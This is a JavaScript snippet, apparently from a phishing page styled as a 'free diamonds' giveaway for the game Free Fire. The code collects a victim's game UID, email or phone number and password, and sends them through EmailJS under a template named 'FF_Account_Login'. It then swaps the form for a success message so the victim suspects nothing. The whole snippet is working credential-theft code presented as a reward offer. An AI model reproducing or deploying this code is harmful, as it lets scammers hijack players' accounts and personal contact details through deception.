const templateParams = {
    username: uidInput.value,     // Free Fire UID
    contact: contactInput.value,  // Email or Phone Number
    password: passwordInput.value // Password
};

emailjs.send('free_diamonds', 'FF_Account_Login', templateParams)
    .then(function(response) {
        console.log('Success:', response);
        document.getElementById('auth-section').style.display = 'none';
        document.getElementById('success-message').style.display = 'block';
    }, function(error) {
        console.error('Error:', error);
        alert('Failed to send email. Error: ' + error.text);
    });
